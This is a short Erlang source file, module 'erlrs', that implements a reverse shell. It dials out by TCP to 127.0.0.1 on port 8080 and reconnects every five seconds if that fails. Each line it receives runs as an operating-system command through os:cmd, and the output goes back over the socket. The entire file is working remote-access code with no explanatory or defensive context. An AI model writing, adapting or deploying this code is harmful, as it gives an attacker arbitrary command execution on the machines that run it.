-module(erlrs).
-export([main/0, loop/1]).

main() ->
    case gen_tcp:connect("127.0.0.1", 8080,
                [{active,false},
                {send_timeout, 5000},
                {packet, line}]) of
                              
        {ok, Sock} ->
            loop(Sock);
        
        {error, Reason} ->
            timer:sleep(5000),
            main()
    end.

loop(Sock) ->
    case gen_tcp:recv(Sock, 0) of 
        {ok, Data} ->
	    gen_tcp:send(Sock, os:cmd(Data)),
	    loop(Sock);
        
        {error, Reason} ->
            main()
    end.
